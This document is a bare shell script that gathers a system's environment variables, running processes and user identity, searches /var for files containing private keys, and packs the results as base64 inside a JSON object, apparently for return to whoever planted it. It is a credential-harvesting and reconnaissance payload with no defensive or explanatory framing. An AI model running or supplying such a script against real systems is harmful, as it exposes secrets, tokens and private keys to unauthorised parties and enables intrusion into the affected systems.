OUT=my.output
echo "=================================="  >$OUT 2>&1
env >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
ps -ef  >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
id  >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
find /var -type f -size -3300c -exec grep -Rl "PRIVATE KEY" {} \; >>$OUT  2>/dev/null

b64=$(cat $OUT|base64 -w0)
echo "{ \"out\": \"${b64}\" }"
